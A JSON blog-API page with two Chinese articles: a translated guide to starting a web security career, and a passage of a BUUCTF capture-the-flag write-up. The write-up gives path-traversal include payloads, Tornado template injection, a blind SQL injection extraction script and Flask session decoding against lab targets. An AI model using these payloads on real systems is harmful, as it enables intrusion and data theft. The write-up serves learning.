{"total":50,"pageSize":8,"pageCount":7,"data":[{"title":"How do I learn Web security?","slug":"How-do-I-learn-Web-security","date":"2020-04-29T16:00:00.000Z","updated":"2020-04-30T03:23:43.764Z","comments":true,"path":"api/articles/How-do-I-learn-Web-security.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"How-do-I-learn-Web-security\"><a href=\"#How-do-I-learn-Web-security\" class=\"headerlink\" title=\"How do I learn Web security?\"></a>How do I learn Web security?</h1><h2 id=\"十个步骤开始你的-Web-应用安全职业\"><a href=\"#十个步骤开始你的-Web-应用安全职业\" class=\"headerlink\" title=\"十个步骤开始你的 Web 应用安全职业\"></a>十个步骤开始你的 Web 应用安全职业</h2><p>翻译自 <a href=\"https://www.quora.com/How-do-I-learn-Web-security\" target=\"_blank\" rel=\"noopener\">其中一个回答</a></p>\n<h3 id=\"熟练使用-Linux\"><a href=\"#熟练使用-Linux\" class=\"headerlink\" title=\"熟练使用 Linux\"></a>熟练使用 Linux</h3><p>​        我对此不够强调。如果您刚开始使用Web应用程序安全，那么强烈建议您熟悉Linux。这可能意味着放弃Windows实例（如果需要），然后完全迁移到Linux。</p>\n<p>​        这是因为通常在渗透测试期间，您会遇到基于Linux构建的环境。是的，那里有许多Windows服务器，但是Linux的普及是不容忽视的。我将2年的时间从Windows切换回Linux，这是我的全职环境，它在使用各种工具和脚本以及入侵Web应用程序时为我提供了帮助，我需要更多的利用才能获得更多控制目标。</p>\n<p>​        您可以使用Kali Linux，但也可以考虑将 Ubuntu 作为全职操作系统启动，并学习Linux附带的各种细节，并熟悉诸如安装新软件包，配置工具之类的基本任务。 ，编写自动化脚本和 cron 任务等。</p>\n<h3 id=\"找到一个导师、多问问题并且利用网上的资源\"><a href=\"#找到一个导师、多问问题并且利用网上的资源\" class=\"headerlink\" title=\"找到一个导师、多问问题并且利用网上的资源\"></a>找到一个导师、多问问题并且利用网上的资源</h3><p>​        我绝对可以理解当您进入安全领域时的热情和冲动 - 您想学习一切，然后有成百上千的博客文章提到特定的“安全研究人员”如何破坏给定的目标。</p>\n<p>​        是的，您将需要学习所有这些，但是需要将其纳入计划中，而不是<strong>一次全部</strong>，尤其是在开始时。尝试从 Web 应用程序安全性的基础开始，重点是查找常见的安全问题，将这些知识应用于易受攻击的目标，然后转向以实际的Web应用程序为目标。还建议您找一位自己完成整个旅程的导师，并可以为您提供所需的指导。</p>\n<p>​        话虽这么说，但请记住，由于导师的角色不同，他们将无法花费大量时间来指导您，而只能给您一点点建议的方法。你需要利用这些零散的东西来成为专业人士，并使用在线资源来进一步研究感兴趣的主题。</p>\n<p>​        有许多 Youtube 频道，博客文章和文章以及在线教育资源可以帮助您。您还应该参与在线讨论和各种论坛，以使社区感到舒适并分享您从第一手经验中学到的知识。</p>\n<p>​        切记-如果您在每个时间点都要求别人帮助，这会让您放慢脚步。自己掌握事物并在线上学习。</p>\n<h3 id=\"OWASP-TOP-10-AND-PTES\"><a href=\"#OWASP-TOP-10-AND-PTES\" class=\"headerlink\" title=\"OWASP TOP 10 AND PTES\"></a><strong>OWASP TOP 10 AND PTES</strong></h3><p>​        作为对Web应用程序安全性感兴趣的学习者，您可能多次遇到过 <code>OWASP Top 10</code> 一词。 </p>\n<p>​        根据我起步时的经验，强烈建议您同时阅读 OWASP Top 10 名和渗透测试执行标准(PTES)，以使您对Web应用程序的安全性和方式有更清晰，更深入的了解。 我还建议您加入OWASP 或任何类似且相关的安全社区的本地聚会组织，并参加聚会。 一旦您觉得自己有有趣的话题和经验可以分享，请聚会组织者为您提供下一个活动的演讲时间。 </p>\n<p>​        您将获得大量的诚实反馈，批评和学习要点，这将使您成为更好的Web应用程序安全性研究人员。<br>​        <strong>记住-采取行动是成功的第一步，第二步和第三步</strong>。</p>\n<h3 id=\"学习编程语言\"><a href=\"#学习编程语言\" class=\"headerlink\" title=\"学习编程语言\"></a>学习编程语言</h3><p>​        为了成为一名优秀的Web应用程序安全研究人员，您必须精通编程语言。 即使不编写成熟的应用程序（您可以了解更多），您也需要具有足够的知识和了解，以便至少弄清楚特定代码块的用途。</p>\n<p>​        在渗透测试中，您可能会遇到以下情况：拥有应用程序的源代码（白盒渗透测试），或者想要绕过应用程序白名单或破坏正则表达式，所有这些都需要对编程语言有亲身实践的经验并且对它有深入的了解。 原因是在大多数情况下，您不会在线上找到要解决的问题的直接答案，因此需要想出自己的解决方案来破坏应用程序的安全性。</p>\n<p>​        一旦您想编写自己的工具或脚本，编程经验也可以派上用场 。</p>\n<h3 id=\"可以学习一些安全工具但是不要成为脚本小子\"><a href=\"#可以学习一些安全工具但是不要成为脚本小子\" class=\"headerlink\" title=\"可以学习一些安全工具但是不要成为脚本小子\"></a>可以学习一些安全工具但是不要成为脚本小子</h3><p>​        您可能还记得，我在第一点提到您可以使用 Ubuntu （不一定是Kali Linux）开始Web应用程序安全性之旅。 这样做的原因是，一旦您使用 Ubuntu ，就可以更好地了解各种工具的工作方式，以及如何在首次使用时无法解决问题的情况下自行修复错误。 </p>\n<p>​        一旦您有足够的信心，便可以稍后改用 Kali Linux，但请切记，这与工具无关，而与工具的使用方式有关。 在过去几年中进行的大量笔试中，我从未完全依靠工具。 我使用一种方法:工具只是提供我正在从事的工作的帮助。</p>\n<h3 id=\"漏洞目标\"><a href=\"#漏洞目标\" class=\"headerlink\" title=\"漏洞目标\"></a>漏洞目标</h3><p>​        作为刚开始使用Web应用程序安全性的人，请尝试在易受攻击的目标上尝试各种Web应用程序安全性和利用技术。 </p>\n<p>​        如今，您可以利用许多易受攻击的Web应用程序来熟悉Web应用程序安全性概念。 DVWA 和 <a href=\"http://www.itsecgames.com/\" target=\"_blank\" rel=\"noopener\">bWAPP</a> 很好地说明了我作为Web应用程序安全研究人员向您推荐的早期建议。 通过艰巨的练习，从一个脆弱的目标移到另一个目标。<br>​        <strong>阅读，练习和重复</strong>。</p>\n<h3 id=\"每天一个-VM\"><a href=\"#每天一个-VM\" class=\"headerlink\" title=\"每天一个 VM\"></a>每天一个 VM</h3><p>​        为了在Web应用程序安全方面建立成功的职业生涯和专业知识，目标设定至关重要。</p>\n<p>​        这就是我所做的-我准备了所有可能作为虚拟机使用的目标的列表。 有关可用目标的详细列表，请参考 <a href=\"https://www.vulnhub.com/\" target=\"_blank\" rel=\"noopener\">Vulnhub</a> 或 <a href=\"https://www.pentesterlab.com/exercises/web_for_pentester/\" target=\"_blank\" rel=\"noopener\">PentesterLab</a> 。 我为自己设定了一个目标，在最初的30天里每天都使用一个虚拟机，以使自己充分了解可以用来开发Web应用程序的各种技术。</p>\n<p>​         如果您在任何时间遇到困难，也可以参考 WP 并从那里继续前进。 完成练习后，您还可以参考多个演练，以了解实现本目标所用的所有不同方式。 如果您做了30天，请相信我，您将自己意识到您对Web应用程序安全性所获得的信心和技能。</p>\n<h3 id=\"漏洞银行\"><a href=\"#漏洞银行\" class=\"headerlink\" title=\"漏洞银行\"></a>漏洞银行</h3><p>​        是时候从虚拟机转移进入真实世界了。 在 <a href=\"https://hackerone.com/\" target=\"_blank\" rel=\"noopener\">HackerOne</a>，<a href=\"https://bugcrowd.com/\" target=\"_blank\" rel=\"noopener\">BugCrowd</a>上创建一个帐户，然后开始在网站上查找可能找到的任何错误。 我发现对自己有用的方法之一是去不太知名的网站，以增加发现错误的机会。 如果一个特定的网站刚加入漏洞银行你就去寻找它的漏洞，也可以帮忙，而不是执行已经存在了两年的漏洞赏金计划，这对您有所帮助。</p>\n<h3 id=\"READ-READ-READ\"><a href=\"#READ-READ-READ\" class=\"headerlink\" title=\"READ,READ,READ\"></a>READ,READ,READ</h3><p>​        确保每天阅读新的内容。<br>​        从安全网站订阅各种新闻通讯，关注所有相关的博客，关注有关Web应用程序安全性的推特推特帐户，参考最近披露的错误，最重要的是，尝试理解寻找这些错误的思考过程。<br>​        这有一些可能有用的链接：</p>\n<p><a href=\"http://blog.attify.com/\" target=\"_blank\" rel=\"noopener\">Attify Blog</a></p>\n<p><a href=\"https://github.com/ngalongc/bug-bounty-reference/blob/master/README.md\">GitHub Resources </a><br><a href=\"https://github.com/djadmin/awesome-bug-bounty\">GitHub Bounty</a><br><a href=\"https://www.facebook.com/notes/phwd/facebook-bug-bounties/707217202701640\" target=\"_blank\" rel=\"noopener\">FB Bounty</a><br><a href=\"http://roy-castillo.blogspot.in/\" target=\"_blank\" rel=\"noopener\">Roy Castillo Blog</a><br><a href=\"https://labs.detectify.com/\" target=\"_blank\" rel=\"noopener\">Labs Detectify</a><br><a href=\"http://www.nirgoldshlager.com/\" target=\"_blank\" rel=\"noopener\">Nirgoldshlager</a><br><a href=\"https://seanmelia.wordpress.com/\" target=\"_blank\" rel=\"noopener\">Seanmelia Blog</a><br><a href=\"http://blog.geekboy.ninja/\" target=\"_blank\" rel=\"noopener\">Geekboy Ninja Blog</a><br><a href=\"https://forum.bugcrowd.com/t/researcher-resources-bounty-bug-write-ups/1137\" target=\"_blank\" rel=\"noopener\">Bugcrowd Tips</a><br><a href=\"http://www.breaksec.com/?page_id=6002\" target=\"_blank\" rel=\"noopener\">Breaksec</a><br><a href=\"http://homakov.blogspot.in/\" target=\"_blank\" rel=\"noopener\">Homakov Blog</a><br><a href=\"https://bitquark.co.uk/blog/\" target=\"_blank\" rel=\"noopener\">Bitquark Blog</a><br><a href=\"https://nealpoole.com/blog/\" target=\"_blank\" rel=\"noopener\">Nealpoole</a><br><a href=\"http://nahamsec.com/\" target=\"_blank\" rel=\"noopener\">Nahamsec</a><br><a href=\"http://stephensclafani.com/\" target=\"_blank\" rel=\"noopener\">Stephensclafani</a><br><a href=\"http://insertco.in/articles\" target=\"_blank\" rel=\"noopener\">Insertco articles</a><br><a href=\"http://josipfranjkovic.blogspot.in/\" target=\"_blank\" rel=\"noopener\">Josipfranjkovic Blog</a><br><a href=\"http://www.websecuritylog.com/2016/09/google-web-security-bug-reward.html\" target=\"_blank\" rel=\"noopener\">Websecuritylog</a><br><a href=\"https://www.vulnerability-lab.com/get_content.php?id=1176\" target=\"_blank\" rel=\"noopener\">Vulnerability-Lab</a><br><a href=\"https://www.secgeek.net/bookfresh-vulnerability/\" target=\"_blank\" rel=\"noopener\">Secgeek</a><br><a href=\"https://h1.sintheticlabs.com/\" target=\"_blank\" rel=\"noopener\">H1.sintheticlabs</a><br><a href=\"https://blog.it-securityguard.com/\" target=\"_blank\" rel=\"noopener\">Securityguard</a><br><a href=\"http://h1.nobbd.de/\" target=\"_blank\" rel=\"noopener\">H1.nobbd</a></p>\n<h3 id=\"建立属于你自己的东西\"><a href=\"#建立属于你自己的东西\" class=\"headerlink\" title=\"建立属于你自己的东西\"></a>建立属于你自己的东西</h3><p>​        到现在为止，您将有足够的机会进行Web应用程序安全性评估和渗透测试。 接下来的部分是根据您的经验，构建一些您认为对您有用的东西。 仅关注您在未来10或20天内可以构建的内容，这可以帮助您进行错误发现或利用过程。 完成后，您可以将该工具作为开源发布，也可以在组织内部使用（由您自己决定）。 </p>\n<p>​        关键是要利用您所学的知识和技能来构建一些东西。</p>\n<h2 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h2><p>​        我列出了进入Web应用程序安全性的最初旅程中所有可能的学习。 现在就取决于您要掌握这10点并进行研究，并成为一名更好的安全研究人员。 </p>\n<p>​        如果这篇文章对您有所帮助，请在（<a href=\"https://twitter.com/amolbhure\" target=\"_blank\" rel=\"noopener\">@amolbhure</a>）上向我打招呼，或与您认为可以用来建立Web应用程序安全性职业的任何人分享。</p>\n","text":"How do I learn Web security?十个步骤开始你的 Web 应用安全职业翻译自 其中一个回答熟练使用 Linux​        我对此不够强调。如果您刚开始使用Web应用程序安全，那么强烈建议您熟悉Linux。这可能意味着放弃Windows实例（如果需要）","link":"","raw":null,"photos":[],"categories":[{"name":"read","slug":"read","count":1,"path":"api/categories/read.json"}],"tags":[{"name":"source","slug":"source","count":1,"path":"api/tags/source.json"}]},{"title":"BUUCTF 刷题(1)","slug":"BUUCTF-WP","date":"2020-04-29T06:43:09.000Z","updated":"2020-05-09T08:30:09.692Z","comments":true,"path":"api/articles/BUUCTF-WP.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"BUUCTF-wp\"><a href=\"#BUUCTF-wp\" class=\"headerlink\" title=\"BUUCTF  wp\"></a>BUUCTF  wp</h1><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Warm-up\"><a href=\"#Warm-up\" class=\"headerlink\" title=\"Warm up\"></a>Warm up</h3><p>查看源码</p>\n<pre><code> &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) {\n                echo &quot;you can&apos;t see it&quot;;\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo &quot;you can&apos;t see it&quot;;\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST[&apos;file&apos;])\n        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])\n    ) {\n        include $_REQUEST[&apos;file&apos;];\n        exit;\n    } else {\n        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n    }  \n?&gt; </code></pre><p>存在 <code>phpmyadmin 4.8.1</code> 远程文件包含漏洞 <code>cve-2018-12613</code></p>\n<blockquote>\n<p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p>\n<p>mb_substr — 获取部分字符串</p>\n</blockquote>\n<p>因为考虑到 <code>file</code> 可能带参数的问题所以先进行了一次 <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ，如果这里接下来的判断通过则直接返回 <code>true</code> 。如果失败则对返回的结果进行一次 <code>urldecode</code> ，我们知道浏览器会自动将传输的数据进行一次解码，所以我们传入二次编码的 <code>?-&gt;%253F</code> 之后会经过两次解码得到 <code>?</code> ,从而使返回 <code>true</code> .在 <code>checkfile</code> 返回 <code>true</code> 之后我们就有了目录穿越包含文件。</p>\n<p>我们有两种方法:</p>\n<pre><code>?file=hint.php?../../../../../ffffllllaaaagggg\nfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id=\"easy-tornado\"><a href=\"#easy-tornado\" class=\"headerlink\" title=\"easy_tornado\"></a>easy_tornado</h2><p>打开页面发现三个链接，内容如下</p>\n<pre><code>/flag.txt                //flag in /fllllllllllllag\n/welcome.txt            //render\n/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>应该是模板注入，而且需要 cookie_secret .抓包并没有抓到 cookie </p>\n<p>观察链接： <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> 我们直接访问/fllllllllllllag 报错 <code>/error?msg=Error</code> ，在error 这里尝试 SSTI： <code>error?msg=1</code> 可以执行静态表达式，但是不能做运算。</p>\n<p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> &lt;title&gt;</span><br><span class=\"line\"><span class=\"number\">2</span>     &#123;&#123; escape(handler.settings[<span class=\"string\">\"blog_title\"</span>]) &#125;&#125;</span><br><span class=\"line\">3 &lt;/title&gt;</span><br></pre></td></tr></table></figure>\n\n<p>但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！后来重新翻了一下文档，发现又是一个别名。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RequestHandler.settings</span><br><span class=\"line\"></span><br><span class=\"line\">An alias <span class=\"keyword\">for</span> self.application.settings.</span><br></pre></td></tr></table></figure>\n\n<p>handler 指向RequestHandler</p>\n<p>而RequestHandler.settings又指向self.application.settings</p>\n<p>所有handler.settings就指向RequestHandler.application.settings了！</p>\n<p>所以当我们访问 <code>RequestHandler.application.settings</code> 失败时，我们访问 <code>handler.settings</code> 得到 <code>secret_key</code> ,之后使用脚本进行 md5加密之后访问即可：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashli</span><br><span class=\"line\">​\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5value</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">​\t    md5 = hashlib.md5()</span><br><span class=\"line\">​\t    md5.update(s.encode())</span><br><span class=\"line\">​\t    <span class=\"keyword\">return</span> md5.hexdigest()</span><br><span class=\"line\">\t</span><br><span class=\"line\">​\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">mdfive2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">​\t    filename = <span class=\"string\">'/fllllllllllllag'</span></span><br><span class=\"line\">​\t    cookie = <span class=\"string\">r\"M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r\"</span></span><br><span class=\"line\">​\t    <span class=\"comment\">#print(md5value(filename))</span></span><br><span class=\"line\">​\t    <span class=\"comment\"># print(md5value('*c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h~R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U'))</span></span><br><span class=\"line\">​\t    <span class=\"comment\"># print(''+md5value(filename))</span></span><br><span class=\"line\">​\t    print(md5value(cookie + md5value(filename)))<span class=\"comment\">#hints md5(cookie_secret+md5(filename))</span></span><br><span class=\"line\">​\tmdfive2()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CISCN-hack-world\"><a href=\"#CISCN-hack-world\" class=\"headerlink\" title=\"CISCN-hack_world\"></a>CISCN-hack_world</h2><p>进入靶机，看到：</p>\n<pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;\nNow, just give the id of passage</code></pre><p>输入0，1，2 分别有不同回显，输入部分关键字显示 <code>bool(false)</code> ,应该是布尔盲注。在bp里FUZZ，<code>or、and、/*、union、空格</code>等都被过滤了。</p>\n<p>直接 <code>select flag from flag</code> 查询被过滤，绕过空格可以用括号 <code>select(flag)from(flag)</code> </p>\n<p>用二分法猜解名字</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php'</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">\"id\"</span>:<span class=\"string\">\"\"</span>&#125;</span><br><span class=\"line\">flag = <span class=\"string\">'flag&#123;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    begin = <span class=\"number\">32</span></span><br><span class=\"line\">    end = <span class=\"number\">126</span></span><br><span class=\"line\">    tmp = (begin+end)//<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> begin&lt;end:</span><br><span class=\"line\">        print(begin,tmp,end)</span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">        data[<span class=\"string\">\"id\"</span>] = <span class=\"string\">\"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)\"</span>.format(i,tmp)</span><br><span class=\"line\">        r = requests.post(url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Hello'</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            begin = tmp+<span class=\"number\">1</span></span><br><span class=\"line\">            tmp = (begin+end)//<span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            end = tmp</span><br><span class=\"line\">            tmp = (begin+end)//<span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    flag+=chr(tmp)</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag[<span class=\"number\">-1</span>]==<span class=\"string\">'&#125;'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HCTF-admin\"><a href=\"#HCTF-admin\" class=\"headerlink\" title=\"HCTF admin\"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p>\n<h3 id=\"flask-session-伪造\"><a href=\"#flask-session-伪造\" class=\"headerlink\" title=\"flask-session 伪造\"></a>flask-session 伪造</h3><p>从源码得到提示下载到了源码</p>\n<p>贴一部分代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.html</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">\"nav\"</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\"><span class=\"comment\">&lt;!-- you are not admin --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">\"nav\"</span>&gt;</span>Welcome to hctf<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Config</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    SECRET_KEY = os.environ.get(<span class=\"string\">'SECRET_KEY'</span>) <span class=\"keyword\">or</span> <span class=\"string\">'ckj123'</span></span><br><span class=\"line\">    SQLALCHEMY_DATABASE_URI = <span class=\"string\">'mysql+pymysql://root:adsl1234@db:3306/test'</span></span><br><span class=\"line\">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">routes.py/change</span><br><span class=\"line\">​\t</span><br><span class=\"line\"><span class=\"meta\">\t@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> current_user.is_authenticated:</span><br><span class=\"line\">\t        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">\t    form = NewpasswordForm()</span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">\t        name = strlower(session[<span class=\"string\">'name'</span>])</span><br><span class=\"line\">\t        user = User.query.filter_by(username=name).first()</span><br><span class=\"line\">\t        user.set_password(form.newpassword.data)</span><br><span class=\"line\">\t        db.session.commit()</span><br><span class=\"line\">\t        flash(<span class=\"string\">'change successful'</span>)</span><br><span class=\"line\">\t        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'change.html'</span>, title = <span class=\"string\">'change'</span>, form = form)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到用 admin 账户登陆即可得到 flag，这里涉及到了 flask session 伪造，简单搜索我们可以很容易搜到p神的 session<br>解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask.sessions <span class=\"keyword\">import</span> session_json_serializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> itsdangerous <span class=\"keyword\">import</span> base64_decode</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decryption</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    payload, sig = payload.rsplit(<span class=\"string\">b'.'</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    payload, timestamp = payload.rsplit(<span class=\"string\">b'.'</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    decompress = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.startswith(<span class=\"string\">b'.'</span>):</span><br><span class=\"line\">        payload = payload[<span class=\"number\">1</span>:]</span><br><span class=\"line\">        decompress = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        payload = base64_decode(payload)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> Exception(<span class=\"string\">'Could not base64 decode the payload because of '</span></span><br><span class=\"line\">                         <span class=\"string\">'an 